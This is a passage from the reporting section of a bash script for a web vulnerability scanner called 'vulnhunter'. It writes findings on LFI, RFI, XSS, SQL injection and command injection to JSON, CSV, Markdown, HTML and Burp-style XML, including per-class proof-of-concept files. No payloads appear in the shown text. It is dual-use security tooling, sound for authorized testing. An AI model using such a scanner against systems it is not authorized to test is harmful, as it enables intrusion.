  | jq -R -s 'split("\n") | map(select(length>0) | split("\t") |
      {class:.[0], severity:.[1], url:.[2], param:.[3], evidence:.[4]})' \
  > "$JSON" 2>/dev/null || echo '[]' >"$JSON"
else
  { echo '['; first=1
    while IFS=$'\t' read -r tag class sev url param ev; do
      [ "$tag" = "REC" ] || continue
      esc() { printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }
      [ $first -eq 1 ] || echo ','; first=0
      printf '  {"class":"%s","severity":"%s","url":"%s","param":"%s","evidence":"%s"}' \
        "$(esc "$class")" "$(esc "$sev")" "$(esc "$url")" "$(esc "$param")" "$(esc "$ev")"
    done <"$REC_FILE"; echo; echo ']'; } >"$JSON"
fi

# ---- CSV ----
CSV="$OUTDIR/report.csv"
{ echo "class,severity,url,param,evidence"
  awk -F'\t' '$1=="REC"{
    gsub(/"/,"\"\"",$2);gsub(/"/,"\"\"",$3);gsub(/"/,"\"\"",$4);gsub(/"/,"\"\"",$5);gsub(/"/,"\"\"",$6);
    printf "\"%s\",\"%s\",\"%s\",\"%s\",\"%s\"\n",$2,$3,$4,$5,$6}' "$REC_FILE"
} >"$CSV"

# ---- Per-class Markdown ----
for c in LFI RFI XSS SQLI CMDI; do
  md="$OUTDIR/$(printf '%s' "$c" | tr 'A-Z' 'a-z').md"
  { printf '# %s findings\n\n' "$c"
    awk -F'\t' -v C="$c" '$1=="REC" && toupper($2)==C {
      printf "## [%s] param `%s`\n\n- URL: %s\n- Evidence: %s\n\n", $3,$5,$4,$6 }' "$REC_FILE"
  } >"$md"
done

# ---- HTML ----
HTML="$OUTDIR/report.html"
{
cat <<H
<!doctype html><html><head><meta charset="utf-8"><title>vulnhunter report</title>
<style>
body{font:14px/1.5 system-ui,Segoe UI,Arial;margin:0;background:#0d1117;color:#e6edf3}
header{padding:20px 28px;background:#161b22;border-bottom:1px solid #30363d}
h1{margin:0;font-size:20px}.sub{color:#8b949e;font-size:12px}
.wrap{padding:20px 28px}.cards{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:18px}
.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px 18px;min-width:110px}
.card b{font-size:22px}table{width:100%;border-collapse:collapse;font-size:13px}
th,td{text-align:left;padding:8px 10px;border-bottom:1px solid #21262d;vertical-align:top}
th{color:#8b949e}tr:hover td{background:#161b22}
.sev{font-weight:700;padding:2px 8px;border-radius:20px;font-size:11px}
.CONFIRMED{background:#8957e5;color:#fff}.HIGH{background:#da3633;color:#fff}
.LOW{background:#9e6a03;color:#fff}.OOB-CHECK{background:#1f6feb;color:#fff}
.cls{font-weight:700}code{background:#0d1117;border:1px solid #30363d;padding:1px 5px;border-radius:5px;word-break:break-all}
</style></head><body>
<header><h1>vulnhunter report</h1>
<div class="sub">generated $(date) &middot; mode: ${MODE} &middot; targets: ${TOTAL_TARGETS} &middot; findings: ${TOTAL_FIND}</div>
</header><div class="wrap"><div class="cards">
H
for c in CONFIRMED HIGH LOW; do
  n=$(awk -F'\t' -v S="$c" '$1=="REC"&&$3==S' "$REC_FILE" | wc -l | tr -d ' ')
  printf '<div class="card"><div class="sub">%s</div><b>%s</b></div>\n' "$c" "$n"
done
cat <<'H'
</div><table><thead><tr><th>Severity</th><th>Class</th><th>URL</th><th>Param</th><th>Evidence / PoC</th></tr></thead><tbody>
H
awk -F'\t' '$1=="REC"{print}' "$REC_FILE" | while IFS=$'\t' read -r tag class sev url param ev; do
  esc(){ printf '%s' "$1" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g'; }
  printf '<tr><td><span class="sev %s">%s</span></td><td class="cls">%s</td><td><code>%s</code></td><td>%s</td><td><code>%s</code></td></tr>\n' \
    "$sev" "$sev" "$(esc "$class")" "$(esc "$url")" "$(esc "$param")" "$(esc "$ev")"
done
echo '</tbody></table></div></body></html>'
} >"$HTML"

# ---- Burp-style XML ----
XML="$OUTDIR/report.burp.xml"
{ echo '<?xml version="1.0"?>'; echo '<issues>'
  awk -F'\t' '$1=="REC"{print}' "$REC_FILE" | while IFS=$'\t' read -r tag class sev url param ev; do
    esc(){ printf '%s' "$1" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g'; }
    printf '  <issue><type>%s</type><severity>%s</severity><url>%s</url><param>%s</param><detail>%s</detail></issue>\n' \
      "$(esc "$class")" "$(esc "$sev")" "$(esc "$url")" "$(esc "$param")" "$(esc "$ev")"
  done
  echo '</issues>'
} >"$XML"

#--------------------------- 7. Summary ---------------------------------------
echo >&2
ok "Done. ${C_BLD}${TOTAL_FIND}${C_RST} finding(s)."
if [ "$TOTAL_FIND" -gt 0 ]; then
  for s in CONFIRMED HIGH LOW OOB-CHECK; do
    n=$(awk -F'\t' -v S="$s" '$1=="REC"&&$3==S' "$REC_FILE" | wc -l | tr -d ' ')
    [ "$n" -gt 0 ] && printf '    %s: %s\n' "$s" "$n" >&2
  done
fi
cat >&2 <<EOF

Reports written to ${C_BLD}${OUTDIR}/${C_RST}
  report.json            structured findings
  report.csv             bug-bounty import
  report.html            visual report (open in browser)
  report.burp.xml        Burp-style issue list
  {lfi,rfi,xss,sqli,cmdi}.md   per-class PoCs
  classified_targets.tsv classification map
  findings.tsv           raw records
EOF
